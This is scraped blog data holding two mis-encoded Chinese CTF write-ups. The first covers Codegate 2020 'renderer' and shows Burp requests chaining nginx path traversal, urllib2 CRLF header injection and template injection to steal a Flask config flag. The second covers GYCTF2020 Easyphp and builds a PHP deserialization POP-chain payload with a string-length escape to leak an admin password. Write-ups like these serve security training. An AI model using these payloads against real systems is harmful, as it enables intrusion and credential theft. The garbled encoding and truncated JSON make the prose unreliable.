CODEGATE2020&#123;**DELETED**&#125;RUN apt-get updateRUN apt-get install -y nginxRUN pip install flask uwsgiADD prob_src/src /home/srcADD settings/nginx-flask.conf /tmp/nginx-flask.confADD prob_src/static /home/staticRUN chmod 777 /home/staticRUN mkdir /home/ticketsRUN chmod 777 /home/ticketsADD settings/run.sh /home/run.shRUN chmod +x /home/run.shADD settings/cleaner.sh /home/cleaner.shRUN chmod +x /home/cleaner.shCMD [&quot;/bin/bash&quot;, &quot;/home/run.sh&quot;] ä¸Šæ¥æ³¨æ„åˆ°çš„æ˜¯ç»™çš„æ˜¯/rendererï¼Œè€Œä¸æ˜¯åªæœ‰ä¸€ä¸ªIPåœ°å€ã€‚ç›´æ¥è®¿é—®IPåœ°å€åå‘ç°æ˜¯NginxæœåŠ¡å™¨ã€‚é‚£ä¹ˆå¾ˆå®¹æ˜“æƒ³åˆ°Nginxçš„ä¸å½“é…ç½®å¯¼è‡´è·¯å¾„ç©¿è¶Šã€‚æ‰“å¼€é¡µé¢åæç¤ºæ˜¯ä¸ªProxy Serverï¼ŒSSRFæ²¡è·‘äº†ã€‚æŸ¥çœ‹ç½‘é¡µæºä»£ç å‘ç°å¼•ç”¨äº†/static/css/renderer.cssï¼Œé‚£ä¹ˆæˆ‘ä»¬è¯•ç€è®¿é—®/static../ï¼Œæœç„¶è·¯å¾„ç©¿è¶Šäº†ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æ‰’ä¸‹æ¥æ‰€æœ‰æºç äº†ã€‚ /home/src/uwsgi.ini12345678910111213[uwsgi]chdir = /home/src/module = runcallable = appprocesses = 4uid = www-datagid = www-datasocket = /tmp/renderer.sockchmod-socket = 666vacuum = truedaemonize = /tmp/uwsgi.logdie-on-term = truepidfile = /tmp/renderer.pid /home/src/run.py12345678910from app import *import sysdef main(): #TODO : disable debug app.run(debug=False, host=&quot;0.0.0.0&quot;, port=8080)if __name__ == &#x27;__main__&#x27;: main() /home/src/app/routes.py123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118from __future__ import print_functionfrom flask import Flask, render_template, render_template_string, request, redirect, abort, Blueprintimport urllib2import timeimport hashlibfrom os import pathfrom urlparse import urlparseimport sysfront = Blueprint(&quot;renderer&quot;, __name__)@front.before_requestdef test(): print(&#x27;!!!!&#x27;, request.url, file=sys.stderr)@front.route(&quot;/&quot;, methods=[&quot;GET&quot;, &quot;POST&quot;])def index(): if request.method == &quot;GET&quot;: return render_template(&quot;index.html&quot;) url = request.form.get(&quot;url&quot;) res = proxy_read(url) if url else False if not res: abort(400) return render_template(&quot;index.html&quot;, data = res)@front.route(&quot;/whatismyip&quot;, methods=[&quot;GET&quot;])def ipcheck(): return render_template(&quot;ip.html&quot;, ip = get_ip(), real_ip = get_real_ip())@front.route(&quot;/admin&quot;, methods=[&quot;GET&quot;])def admin_access(): ip = get_ip() rip = get_real_ip() if ip not in [&quot;127.0.0.1&quot;, &quot;127.0.0.2&quot;]: #super private ip :) abort(403) if ip != rip: #if use proxy ticket = write_log(rip) return render_template(&quot;admin_remote.html&quot;, ticket = ticket) else: if ip == &quot;127.0.0.2&quot; and request.args.get(&quot;body&quot;): ticket = write_extend_log(rip, request.args.get(&quot;body&quot;)) return render_template(&quot;admin_local.html&quot;, ticket = ticket) else: return render_template(&quot;admin_local.html&quot;, ticket = None)@front.route(&quot;/admin/ticket&quot;, methods=[&quot;GET&quot;])def admin_ticket(): print(&#x27;!!!! admin_ticket()&#x27;, file=sys.stderr) ip = get_ip() rip = get_real_ip() if ip != rip: #proxy doesn&#x27;t allow to show ticket print(&#x27;!!!!&#x27;, 1, file=sys.stderr) abort(403) if ip not in [&quot;127.0.0.1&quot;, &quot;127.0.0.2&quot;]: #only local print(&#x27;!!!!&#x27;, 2, file=sys.stderr) abort(403) if request.headers.get(&quot;User-Agent&quot;) != &quot;AdminBrowser/1.337&quot;: print(&#x27;!!!!&#x27;, request.headers.get(&quot;User-Agent&quot;), file=sys.stderr) abort(403) if request.args.get(&quot;ticket&quot;): log = read_log(request.args.get(&quot;ticket&quot;)) if not log: print(&#x27;!!!!&#x27;, 4, file=sys.stderr) abort(403) return render_template_string(log)def get_ip(): return request.remote_addrdef get_real_ip(): return request.headers.get(&quot;X-Forwarded-For&quot;) or get_ip()def proxy_read(url): #TODO : implement logging s = urlparse(url).scheme if s not in [&quot;http&quot;, &quot;https&quot;]: #sjgdmfRk akfRk return &quot;&quot; return urllib2.urlopen(url).read()def write_log(rip): print(&#x27;!!!! write_log()&#x27;, file=sys.stderr) tid = hashlib.sha1(str(time.time()) + rip).hexdigest() with open(&quot;/home/tickets/%s&quot; % tid, &quot;w&quot;) as f: log_str = &quot;Admin page accessed from %s&quot; % rip f.write(log_str) return tiddef write_extend_log(rip, body): tid = hashlib.sha1(str(time.time()) + rip).hexdigest() with open(&quot;/home/tickets/%s&quot; % tid, &quot;w&quot;) as f: f.write(body) return tiddef read_log(ticket): print(&#x27;!!!! read_log()&#x27;, file=sys.stderr) if not (ticket and ticket.isalnum()): return False if path.exists(&quot;/home/tickets/%s&quot; % ticket): with open(&quot;/home/tickets/%s&quot; % ticket, &quot;r&quot;) as f: return f.read() else: return False /home/src/app/__init__.py12345678from flask import Flaskfrom app import routesimport osapp = Flask(__name__)app.url_map.strict_slashes = Falseapp.register_blueprint(routes.front, url_prefix=&quot;/renderer&quot;)app.config[&quot;FLAG&quot;] = os.getenv(&quot;FLAG&quot;, &quot;CODEGATE2020&#123;&#125;&quot;) templateså°±ä¸æ”¾äº†ï¼Œåœ¨æˆ‘Githubä¸Šæœ‰å®Œæ•´çš„ã€‚ flagä¿å­˜åœ¨Flaskçš„configé‡Œï¼Œåˆ©ç”¨SSRFå°±å¯ä»¥æ‹¿åˆ°ã€‚é‚£ä¹ˆSSRFåœ¨å“ªï¼Ÿadmin_ticket()è·¯ç”±çš„æœ€åä¸€è¡Œrender_template_string()å¾ˆæ˜¾çœ¼ï¼ŒåŒæ—¶admin_local.htmlå’Œadmin_remote.htmlé‡Œéƒ½æœ‰ä¸€å¥ {% if ticket %} Your access log is written with ticket no {{ ticket }} {% endif %} å¾ˆæ˜æ˜¾SSRFäº†ã€‚ä¸‹ä¸€æ­¥æ˜¯æ€ä¹ˆè§¦å‘SSRFã€‚admin_ticket()è·¯ç”±ä¸­ä¼šç”¨get_ip()å’Œget_real_ip()åˆ¤æ–­IPæ¥æºã€‚get_real_ip()ä½¿ç”¨X-Forwarded-Forå¤´è·å–IPã€‚æ²¡å•¥é—®é¢˜ã€‚ æˆ‘ä»¬çš„ç›®æ ‡å¾ˆæ˜æ˜¾æ˜¯è¦é€šè¿‡Proxy Serviceæ¥è®¿é—®/admin/ticketï¼Œç›´æ¥åœ¨æµè§ˆå™¨è®¿é—®ä¼šç”±äºè®¿é—®IPä¸ä¸º127.0.0.1æˆ–127.0.0.2è€Œ403ã€‚ä½†è¦æˆåŠŸè®¿é—®/admin/ticketåˆéœ€è¦è®¾ç½®User-Agentä¸ºAdminBrowser/1.337ã€‚æˆ‘ä»¬å¯æ§çš„æ˜¯X-Forwarded-Forï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬éœ€è¦ä¸€ç§æ–¹å¼å½±å“HTTPå¤´ã€‚ ç ”ç©¶ä¸€ä¸‹proxy_read()ï¼Œå‘ç°æ˜¯ç”¨çš„urllib2.urlopen()ã€‚æœä¸€ä¸‹â€œurllib2 vulnâ€ï¼Œè¿”å›ç¬¬ä¸€ä¸ªé¡µé¢å°±æ˜¯è¿™ä¸ªï¼ŒCRLF Injectionã€‚å¥½æäº†ï¼Œè¿™ä¸ªæ´å¯ä»¥é€šè¿‡æ’å…¥ã€‚é‚£ä¹ˆï¼ŒX-Forwarded-Forå’ŒUser-Agentå°±å¯ä»¥è¢«æ’å…¥äº†ã€‚ åˆ°ç°åœ¨ï¼Œé¢˜ç›®å·²ç»è§£å†³ï¼Œæ”»å‡»æµç¨‹å¦‚ä¸‹ï¼š åˆ©ç”¨urllib2çš„æ¼æ´ï¼Œæ’å…¥X-Forwarded-For: ï¼Œä½¿Proxy Serviceè®¿é—®/renderer/adminï¼Œç”Ÿæˆticketã€‚ åˆ©ç”¨nginxçš„è·¯å¾„ç©¿è¶Šï¼Œè®¿é—®/static../tickets/ï¼Œè·å¾—åˆšæ‰çš„ticketæ–‡ä»¶åã€‚ åˆ©ç”¨urllib2çš„æ¼æ´ï¼Œæ’å…¥User-Agent: AdminBrowser/1.337ï¼Œä½¿Proxy Serviceè®¿é—®/renderer/admin/ticket?ticket=åˆšæ‰çš„æ–‡ä»¶åï¼Œæ¸²æŸ“ticketï¼Œè¯»å‡ºFlaskçš„configï¼Œå¾—åˆ°flagã€‚ OKï¼ŒBurpå‘åŒ…å§ï¼š 1234567891011121314151617POST /renderer/ HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://127.0.0.1/renderer/Content-Type: application/x-www-form-urlencodedContent-Length: 88Origin: http://127.0.0.1Connection: closeCookie: confluence.browse.space.cookie=space-templatesUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheurl=http://127.0.0.1/renderer/admin HTTP/1.1%0d%0aX-Forwarded-For: %0d%0aTEST: 123 è¿”å›æ­£å¸¸é¡µé¢åè®¿é—®/static../tickets/ï¼Œå¾—åˆ°æ–‡ä»¶åï¼šfc75a14b624748a31ddd99ef984df7eaa6781aa9ã€‚ ç„¶åå‘åŒ… 1234567891011121314151617POST /renderer/ HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://127.0.0.1/renderer/Content-Type: application/x-www-form-urlencodedContent-Length: 214Origin: http://127.0.0.1Connection: closeCookie: confluence.browse.space.cookie=space-templatesUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheurl=http://127.0.0.1/renderer/admin/ticket?ticket=fc75a14b624748a31ddd99ef984df7eaa6781aa9 HTTP/1.1%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0aUser-Agent:%20AdminBrowser/1.337%0d%0aHost: 127.0.0.1%0d%0a%0d%0aTEST: 123 ä¸ºä»€ä¹ˆç¬¬äºŒéƒ¨å‘åŒ…éœ€è¦ä¸¤ä¸ª%0d%0aå‘¢ï¼Ÿ GETæ¨¡å¼ä¸‹HTTPå¤´åçš„ä»»ä½•å†…å®¹æ²¡æœ‰æ„ä¹‰ã€‚æˆ‘ä»¬æ­£å¸¸%0d%0aæ³¨å…¥åä¼šå‰©ä¸‹ä¸€ä¸ª\"HTTP/1.1\"ï¼Œè¿™ä¸ªå†…å®¹éœ€è¦å¤„ç†æ‰ï¼Œå¦åˆ™urllib2ä¼šæŠ¥é”™ã€‚å› æ­¤æˆ‘ä»¬ç”¨ç¬¬äºŒä¸ª%0d%0aå¼ºè¡Œç»“æŸHTTPå¤´éƒ¨åˆ†ï¼Œé‚£ä¹ˆ\"HTTP/1.1\"ä¼šè¢«å½“ä½œHTTPå¤´ç»“æŸåçš„å†…å®¹å‡ºç°ï¼ŒGETæ¨¡å¼ä¸‹æ²¡æœ‰æ„ä¹‰ï¼Œä¼šè¢«ä¸¢å¼ƒï¼Œè€Œæˆ‘ä»¬æƒ³æ³¨å…¥çš„å¤´å·²ç»åœ¨å‰é¢å¸ƒç½®å¥½äº†ã€‚","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"Nginx","slug":"Nginx","permalink":"http://tiaonmmn.github.io/tags/Nginx/"}]},{"title":"BUUOJåˆ·é¢˜-Web-GYCTF2020-Easyphp","slug":"BUUOJåˆ·é¢˜-Web-GYCTF2020-Easyphp","date":"2020-03-04T02:36:16.000Z","updated":"2020-03-05T07:02:15.790Z","comments":true,"path":"2020/03/04/BUUOJåˆ·é¢˜-Web-GYCTF2020-Easyphp/","link":"","permalink":"http://tiaonmmn.github.io/2020/03/04/BUUOJ%E5%88%B7%E9%A2%98-Web-GYCTF2020-Easyphp/","excerpt":"GYCTF 2020çš„BabyPHPï¼ˆé¢˜ç›®ä¸Šé”™åå­—äº†ï¼‰ã€‚ å¼€é¢˜è®©ç™»é™†ï¼Œéšæ‰‹è¯•äº†ä¸€ä¸‹www.zipå‘ç°è¿˜çœŸæœ‰æºç ã€‚ã€‚ã€‚ index.phpæ²¡å•¥ï¼Œé™åˆ¶åç¼€åä¸º.phpï¼ŒLFIæ²¡ç”¨å¤„ã€‚login.php Banäº†ä¸€å †å…³é”®å­— 123456789if(isset($_POST[&#x27;username&#x27;]))&#123;if(preg_match(&quot;/union|select|drop|delete|insert|\\#|\\%|\\`|\\@|\\\\\\\\/i&quot;, $_POST[&#x27;username&#x27;]))&#123; die(&quot;&lt;br&gt;Damn you, hacker!&quot;); &#125; if(preg_match(&quot;/union|select|drop|delete|insert|\\#|\\%|\\`|\\@|\\\\\\\\/i&quot;, $_POST[&#x27;password&#x27;]))&#123; die(&quot;Damn you, hacker!&quot;); &#125; $user-&gt;login();&#125;","text":"GYCTF 2020çš„BabyPHPï¼ˆé¢˜ç›®ä¸Šé”™åå­—äº†ï¼‰ã€‚ å¼€é¢˜è®©ç™»é™†ï¼Œéšæ‰‹è¯•äº†ä¸€ä¸‹www.zipå‘ç°è¿˜çœŸæœ‰æºç ã€‚ã€‚ã€‚ index.phpæ²¡å•¥ï¼Œé™åˆ¶åç¼€åä¸º.phpï¼ŒLFIæ²¡ç”¨å¤„ã€‚login.php Banäº†ä¸€å †å…³é”®å­— 123456789if(isset($_POST[&#x27;username&#x27;]))&#123;if(preg_match(&quot;/union|select|drop|delete|insert|\\#|\\%|\\`|\\@|\\\\\\\\/i&quot;, $_POST[&#x27;username&#x27;]))&#123; die(&quot;&lt;br&gt;Damn you, hacker!&quot;); &#125; if(preg_match(&quot;/union|select|drop|delete|insert|\\#|\\%|\\`|\\@|\\\\\\\\/i&quot;, $_POST[&#x27;password&#x27;]))&#123; die(&quot;Damn you, hacker!&quot;); &#125; $user-&gt;login();&#125; login()å‡½æ•°æ¥è‡ªlib.phpã€‚update.phpé‡Œå®ä¾‹åŒ–äº†ä¸€ä¸ªUser()ç±»ï¼Œå¹¶update()ã€‚å¦‚æœ$_SESSION['login']===1å°±è¾“å‡ºflagã€‚ ä¸€ä¸ªå¤§å‘åœ¨äºï¼Œupdate.phpé‡Œåˆ¤æ–­æ²¡æœ‰ç™»å½•åä¼šç»§ç»­æ‰§è¡Œ$user()-&gt;update()ï¼Œå¼€å§‹çš„æ—¶å€™æ²¡æ³¨æ„åˆ°è¿™ç‚¹ï¼Œå¯¼è‡´ä¸€ç›´åœ¨æƒ³å¦‚ä½•åˆ©ç”¨login.phpä¼ å‚ã€‚ã€‚ã€‚ æœ¬é¢˜é‡ç‚¹å°±æ˜¯lib.phpäº†ã€‚Userç±»çš„login()ä»POSTè·å–usernameå’Œpasswordåæ‰§è¡ŒæŸ¥è¯¢ï¼Œè¿”å›ç»“æœå°±åˆ†é…SESSIONã€‚æ²¡å¤ªå¤šæå¤´ï¼Œä½†æ˜¯update()é‡Œå‡ºç°äº†unserialize()ï¼Œå°±å¾ˆæœ‰æ„æ€äº†ï¼š 1234567public function update()&#123; $Info=unserialize($this-&gt;getNewinfo()); $age=$Info-&gt;age; $nickname=$Info-&gt;nickname; $updateAction=new UpdateHelper($_SESSION[&#x27;id&#x27;],$Info,&quot;update user SET age=$age,nickname=$nickname where id=&quot;.$_SESSION[&#x27;id&#x27;]); //è¿™ä¸ªåŠŸèƒ½è¿˜æ²¡æœ‰å†™å®Œ å…ˆå å‘&#125; å…ˆååºåˆ—åŒ–getNewInfo()è¿”å›å€¼ï¼Œåˆè°ƒç”¨äº†UpdateHelper()ã€‚getNewInfo()ä»£ç å¦‚ä¸‹ï¼š 123456789 public function getNewInfo()&#123; $age=$_POST[&#x27;age&#x27;]; $nickname=$_POST[&#x27;nickname&#x27;]; return safe(serialize(new Info($age,$nickname))); &#125; function safe($parm)&#123; $array= array(&#x27;union&#x27;,&#x27;regexp&#x27;,&#x27;load&#x27;,&#x27;into&#x27;,&#x27;flag&#x27;,&#x27;file&#x27;,&#x27;insert&#x27;,&quot;&#x27;&quot;,&#x27;\\\\&#x27;,&quot;*&quot;,&quot;alter&quot;); return str_replace($array,&#x27;hacker&#x27;,$parm);&#125; ä»POSTè·å–ageå’Œnicknameï¼Œè¿”å›safe()å¤„ç†åçš„Info()åºåˆ—åŒ–ç»“æœã€‚safe()ç®€å•çš„å°†ä¸€å †å…³é”®å­—æ›¿æ¢æˆ'hacker'ï¼Œé—®é¢˜å¾ˆå¤§ï¼Œååºåˆ—åŒ–ç»“æœè®°å½•äº†æ¯ä¸ªå­—æ®µçš„é•¿åº¦ï¼Œå¼ºè¡Œæ›¿æ¢ä¼šé€ æˆé¢å¤–è¯»å–ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶äº†ã€‚ Infoç±»ä»£ç å¦‚ä¸‹ï¼š 123456789101112class Info&#123; public $age; public $nickname; public $CtrlCase; public function __construct($age,$nickname)&#123; $this-&gt;age=$age; $this-&gt;nickname=$nickname; &#125; public function __call($name,$argument)&#123; echo $this-&gt;CtrlCase-&gt;login($argument[0]); &#125;&#125; å¾ˆç®€å•çš„èµ‹å€¼è€Œå·²ï¼Œå½“æˆ‘ä»¬è°ƒç”¨ä¸€ä¸ªä¸å­˜åœ¨çš„æ–¹æ³•æ—¶ä¼šè°ƒç”¨CtrlCase-&gt;login()ï¼Œåªæœ‰dbCtrlæœ‰login()æ–¹æ³•è¿˜éœ€è¦ä¸€ä¸ªå‚æ•°ã€‚ UpdateHelperç±»çš„ä»£ç å¦‚ä¸‹ï¼š 12345678910111213Class UpdateHelper&#123; public $id; public $newinfo; public $sql; public function __construct($newInfo,$sql)&#123; $newInfo=unserialize($newInfo); $upDate=new dbCtrl(); &#125; public function __destruct() &#123; echo $this-&gt;sql; &#125;&#125; UpdateHelperä½¿ç”¨\\(newInfoå’Œ\\)sqlæ„é€ ï¼Œè€Œåœ¨é”€æ¯æ—¶åˆä¼šæ˜¾ç¤º\\(sqlçš„å€¼ã€‚æ­£å¸¸ç™»å½•å\\)newInfoåº”è¯¥ä¸ºadminç”¨æˆ·çš„IDï¼Œ\\(sqlåº”è¯¥æ˜¯Infoç±»ï¼Œæ‰€ä»¥\\)this-&gt;sqlæ˜¯ä¸ªç©ºã€‚ Userç±»è¿˜æœ‰ä¸ª__destructæ–¹æ³•ï¼Œä½†æ˜¯æ²¡ä»€ä¹ˆåµç”¨ï¼Œfile_get_contents()çš„ç»“æœæ²¡æœ‰è¾“å‡ºï¼Œæ˜¯ä¸ªå¹²æ‰°ç”¨çš„ã€‚ æˆ‘ä»¬çš„ç›®æ ‡ï¼Œç°åœ¨çœ‹æ¥å°±å‰©ä¸‹ä¸€ä¸ªäº†ï¼Œé€šè¿‡æŸç§æ–¹æ³•å¾—åˆ°adminçš„å¯†ç ï¼Œç™»å½•å¾—åˆ°flagã€‚è€Œè¦å¾—åˆ°flagï¼Œå¾ˆæ˜æ˜¾åªæœ‰é€šè¿‡SQLã€‚Infoç±»çš„__callæ–¹æ³•å¾ˆæ˜æ˜¾è¦æˆ‘ä»¬è°ƒç”¨dbCtrlçš„login()æ–¹æ³•ï¼Œè®©æˆ‘ä»¬ä»»æ„æ‰§è¡ŒSQLè¯­å¥ã€‚å¾—åˆ°adminç”¨æˆ·çš„SQLè¯­å¥ä¸éš¾å†™select password,username from user where username=?ï¼Œå› ä¸ºlogin()è¿”å›çš„æ˜¯idResultï¼Œç¬¬ä¸€ä¸ªç»“æœã€‚Infoçš„__callå¦‚ä½•åˆ«è§¦å‘ï¼Ÿå›è¿‡å¤´çœ‹Userç±»ï¼Œupdate()å‡½æ•°ç”¨åˆ°äº†Infoç±»ï¼ŒUpdateHelperä¹Ÿç”¨åˆ°äº†ï¼Œä½†æ˜¯è¿™äº›éƒ½æ²¡æœ‰æ¶‰åŠåˆ°æ–¹æ³•çš„è°ƒç”¨ï¼Œç„¶åæˆ‘ä»¬å°±çœ‹åˆ°äº†__toString()æ–¹æ³•ï¼š 12345public function __toString()&#123; $this-&gt;nickname-&gt;update($this-&gt;age); return &quot;0-0&quot;;&#125; nicknameå“ªæ¥çš„ï¼Ÿunserialize(getNewInfo())å¾—åˆ°çš„ï¼Œå¦‚æœnicknameæ˜¯Infoç±»ï¼Œnickname-&gt;updateå°±ä¼šè§¦å‘Infoçš„__callã€‚__toString()éœ€è¦ä¸€ä¸ªè¾“å‡ºå­—ç¬¦ä¸²çš„åœ°æ–¹æ‰ä¼šè¢«è°ƒç”¨ï¼Œè€Œæˆ‘ä»¬è¿˜æœ‰ä¸€ä¸ªUpdateHelperçš„__destruct()ï¼Œä¼šecho \\(this-&gt;sqlï¼Œè€Œåœ¨Userç±»ä¸­UpdateHelperçš„è°ƒç”¨ä¸­\\)Infoä¼šè¢«èµ‹å€¼æˆ$this-&gt;sqlã€‚ æ•´ç†ä¸€ä¸‹POPé“¾ï¼Œé¦–å…ˆæ˜¯new UpdateHelper()ï¼Œè°ƒç”¨__destruct()ï¼Œè½¬å‘new User()çš„__toString()ï¼Œè°ƒç”¨nickname-&gt;update()ï¼Œè½¬å‘new Info()çš„__callï¼Œæœ€ç»ˆè½¬å‘new dbCtrl()å¸¦å‡ºadminçš„å¯†ç ã€‚å¦‚å›¾æ‰€ç¤ºï¼š graph LR id1(&quot;UpdateHelper()&quot;) --&gt;|&quot;UpdateHelper-&gt;__destruct()&quot;| id2(&quot;User()&quot;) id2 --&gt;|&quot;User-&gt;__toString()&quot;| id3(&quot;User-&gt;nickname&quot;) id3 --&gt;|&quot;User-&gt;nickname-&gt;update()&quot;| id4(&quot;Info()&quot;) id4 --&gt;|&quot;Info-&gt;__call&quot;| id5(&quot;dbCtrl()&quot;) id5 --&gt;|&quot;SQLæŸ¥è¯¢&quot;| id6(&quot;admin&#39;s password MD5&quot;) å†™Payloadï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;?phpclass User&#123; public $id; public $age = null; public $nickname = null;&#125;class Info&#123; public $age; public $nickname; public $CtrlCase; public function __construct($age, $nickname) &#123; $this-&gt;age = $age; $this-&gt;nickname = $nickname; &#125;&#125;Class UpdateHelper&#123; public $id; public $newinfo; public $sql; public function __construct($newInfo, $sql) &#123; $newInfo = unserialize($newInfo); $upDate = new dbCtrl(); &#125;&#125;class dbCtrl&#123; public $hostname = &quot;127.0.0.1&quot;; public $dbuser = &quot;root&quot;; public $dbpass = &quot;root&quot;; public $database = &quot;test&quot;; public $name = &quot;admin&quot;; public $password; public $mysqli; public $token=&quot;admin&quot;;&#125;$db = new dbCtrl();$user = new User();$info = new Info(&quot;23333&quot;, &quot;1&quot;);$updatehelper = new UpdateHelper(&quot;233333&quot;, &quot;23333333&quot;);$info-&gt;CtrlCase = $db;$user-&gt;nickname = $info;$user-&gt;age = &quot;select password,id from username where username=?&quot;;$updatehelper-&gt;sql=$user;echo serialize($updatehelper); ç»“æœä¸ºO:12:\"UpdateHelper\":3:&#123;s:2:\"id\";N;s:7:\"newinfo\";N;s:3:\"sql\";O:4:\"User\":3:&#123;s:2:\"id\";N;s:3:\"age\";s:49:\"select password,id from username where username=?\";s:8:\"nickname\";O:4:\"Info\":3:&#123;s:3:\"age\";s:5:\"23333\";s:8:\"nickname\";s:8:\"Tiaonmmn\";s:8:\"CtrlCase\";O:6:\"dbCtrl\":8:&#123;s:8:\"hostname\";s:9:\"127.0.0.1\";s:6:\"dbuser\";s:4:\"root\";s:6:\"dbpass\";s:4:\"root\";s:8:\"database\";s:7:\"nu1lctf\";s:4:\"name\";s:5:\"admin\";s:8:\"password\";N;s:6:\"mysqli\";N;s:5:\"token\";s:5:\"admin\";&#125;&#125;&#125;&#125;ã€‚è¿™ä¸ªååºåˆ—åŒ–å‡ºæ¥çš„æ˜¯UpdateHelperç±»ï¼Œè€Œæˆ‘ä»¬çš„è¾“å…¥ç‚¹æ˜¯getNewInfo()å¼•å…¥çš„Infoç±»ã€‚æ€ä¹ˆæ ·èƒ½å¤ŸæŠŠUpdateHelperç±»æ”¾åˆ°Infoç±»ä¸­ï¼Ÿå¾ˆç®€å•ï¼Œæˆ‘ä»¬å¸ƒç½®å¥½çš„UpdateHelperç±»åœ¨ä»€ä¹ˆæ—¶å€™æ‰å‘æŒ¥ä½œç”¨ï¼Ÿè°ƒç”¨__destruct()çš„æ—¶å€™ï¼Œåœ¨æ­£å¸¸è°ƒç”¨User()-&gt;update()çš„æ—¶å€™Info-&gt;CtrlCaseæ²¡æœ‰ä»»ä½•æ„ä¹‰ã€‚æ‰€ä»¥ï¼Œå¦‚æœæˆ‘ä»¬æŠŠInfo-&gt;CtrlCaseè®¾ç½®æˆUpdateHelperç±»æ€ä¹ˆæ ·ï¼Ÿunserialize()ç»“æŸåç”±äºæˆ‘ä»¬æ²¡æœ‰ç”¨åˆ°CtrlCaseï¼Œæ‰€ä»¥ä¼šæ‰§è¡Œ__destructï¼Œå®Œæˆæˆ‘ä»¬æƒ³è¦çš„æ“ä½œã€‚ åˆšæ‰çš„Payloadåº”è¯¥å†åŠ ä¸¤è¡Œï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263&lt;?phpclass User&#123; public $id; public $age = null; public $nickname = null;&#125;class Info&#123; public $age; public $nickname; public $CtrlCase; public function __construct($age, $nickname) &#123; $this-&gt;age = $age; $this-&gt;nickname = $nickname; &#125;&#125;Class UpdateHelper&#123; public $id; public $newinfo; public $sql; public function __construct($newInfo, $sql) &#123; $newInfo = unserialize($newInfo); $upDate = new dbCtrl(); &#125;&#125;class dbCtrl&#123; public $hostname = &quot;127.0.0.1&quot;; public $dbuser = &quot;root&quot;; public $dbpass = &quot;root&quot;; public $database = &quot;test&quot;; public $name = &quot;admin&quot;; public $password; public $mysqli; public $token = &quot;admin&quot;;&#125;$db = new dbCtrl();$user = new User();$info = new Info(&quot;23333&quot;, &quot;Tiaonmmn&quot;);#echo serialize($info);$updatehelper = new UpdateHelper(&quot;1&quot;, &quot;&quot;);$info-&gt;CtrlCase = $db;$user-&gt;nickname = $info;$user-&gt;age = &quot;select password,id from username where username=?&quot;;$updatehelper-&gt;sql = $user;#echo serialize($updatehelper);$realinfo = new Info(&quot;233333&quot;, &quot;Tiaonmmn&quot;);$realinfo-&gt;CtrlCase = $updatehelper;echo serialize($realinfo); O:4:\"Info\":3:&#123;s:3:\"age\";s:1:\"1\";s:8:\"nickname\";s:588:\"hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker\";s:8:\"CtrlCase\";O:12:\"UpdateHelper\":3:&#123;s:2:\"id\";N;s:7:\"newinfo\";N;s:3:\"sql\";O:4:\"User\":3:&#123;s:2:\"id\";N;s:3:\"age\";s:45:\"select password,id from user where username=?\";s:8:\"nickname\";O:4:\"Info\":3:&#123;s:3:\"age\";s:5:\"23333\";s:8:\"nickname\";s:8:\"Tiaonmmn\";s:8:\"CtrlCase\";O:6:\"dbCtrl\":8:&#123;s:8:\"hostname\";s:9:\"127.0.0.1\";s:6:\"dbuser\";s:4:\"root\";s:6:\"dbpass\";s:4:\"root\";s:8:\"database\";s:4:\"test\";s:4:\"name\";s:5:\"admin\";s:8:\"password\";N;s:6:\"mysqli\";N;s:5:\"token\";s:5:\"admin\";&#125;&#125;&#125;&#125;&#125;\";s:8:\"CtrlCase\";N;&#125;ï¼Œè¿™æ ·å°±ç¬¦åˆgetNewInfo()çš„æ¡ä»¶äº†ã€‚ è¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬æ€ä¹ˆä¼ Payloadï¼Ÿå‘åŒ…çš„æ—¶å€™æˆ‘ä»¬åªèƒ½è¾“å…¥ageå’Œnicknameå‚æ•°ï¼ŒCtrlCaseæ²¡åŠæ³•ä¼ è¿›å»ã€‚å†å›è¿‡å¤´çœ‹æºç ï¼Œå‘ç°ä¸€ç›´ä»¥æ¥æˆ‘ä»¬éƒ½å¿˜è®°äº†ä¸€æ ·ä¸œè¥¿ 12345public function getNewInfo()&#123; $age=$_POST[&#x27;age&#x27;]; $nickname=$_POST[&#x27;nickname&#x27;]; return safe(serialize(new Info($age,$nickname)));&#125; 